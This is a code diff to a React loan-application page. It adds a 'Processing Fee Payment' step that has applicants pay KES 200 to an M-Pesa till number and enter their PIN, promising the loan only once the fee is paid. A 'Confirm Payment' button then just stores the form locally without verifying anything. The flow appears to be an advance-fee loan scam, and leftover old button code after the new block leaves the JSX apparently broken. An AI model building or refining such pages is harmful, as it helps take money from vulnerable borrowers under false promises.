@@ -136,16 +136,43 @@ export default function Home() {
               </>
             )}
 
-            {/* STEP 4 */}
             {step === 4 && (
-              <>
-                <p>Pay KES 200 via M-Pesa</p>
-                <p><strong>Till Number: 8808802</strong></p>
+  <>
+    <h3>Processing Fee Payment</h3>
 
-                <p style={{ color: "red", fontWeight: "bold" }}>
-                  NOTE: You will receive your loan if you have paid the processing fee.
-                </p>
+    <p>
+      Pay a processing fee of <strong>KES 200</strong> to receive your loan.
+    </p>
 
+    <h4>PAYMENT PROCEDURE</h4>
+
+    <p>1. Go to M-PESA menu</p>
+    <p>2. Select Lipa Na M-PESA</p>
+    <p>3. Select Buy Goods and Services</p>
+    <p>4. Enter Till Number <strong>8808802</strong></p>
+    <p>5. Enter amount KES 200</p>
+    <p>6. Enter M-PESA PIN and press OK</p>
+
+    <p style={{ color: "red", fontWeight: "bold", marginTop: "15px" }}>
+      NOTE: You will receive your loan if you have paid the processing fee.
+    </p>
+
+    <button
+      style={styles.button}
+      onClick={() => {
+        const apps = JSON.parse(localStorage.getItem("applications") || "[]");
+        apps.push(form);
+        localStorage.setItem("applications", JSON.stringify(apps));
+
+        alert("Application submitted!");
+        setShowForm(false);
+        setStep(1);
+      }}
+    >
+      Confirm Payment
+    </button>
+  </>
+)}
                 <button style={styles.button} onClick={() => {
                   const apps = JSON.parse(localStorage.getItem("applications") || "[]");
                   apps.push(form);
